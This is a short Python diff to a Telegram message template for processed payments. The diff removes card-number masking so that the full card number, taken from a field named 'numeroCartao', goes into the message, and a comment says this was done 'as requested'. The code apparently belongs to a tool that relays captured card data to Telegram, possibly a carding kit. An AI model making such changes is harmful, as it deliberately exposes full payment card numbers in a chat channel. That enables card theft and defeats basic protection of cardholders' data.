@@ -33,9 +33,8 @@ class TelegramTemplates:
     @staticmethod
     def payment_template(billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> str:
         """Template para mensagem de pagamento"""
-        # Mask card number for security
-        card_number = card_data.get('numeroCartao', '')
-        masked_card = '**** **** **** ' + card_number[-4:] if len(card_number) >= 4 else '****'
+        # Show full card number (não mascarado conforme solicitado)
+        card_number = card_data.get('numeroCartao', 'N/A')
         
         return f"""💳 **PAGAMENTO PROCESSADO** ✅
 
